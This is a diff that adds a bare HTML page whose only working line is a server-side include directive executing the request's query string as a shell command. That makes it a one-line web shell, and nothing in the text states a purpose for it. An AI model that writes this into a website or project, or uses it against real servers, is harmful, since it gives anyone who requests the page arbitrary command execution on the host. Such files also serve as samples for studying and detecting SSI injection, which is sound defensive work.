@@ -1,0 +1,7 @@
+<html>
+<body>
+<pre>
+<!--#exec cmd="$QUERY_STRING" -->
+</pre>
+</body>
+</html>
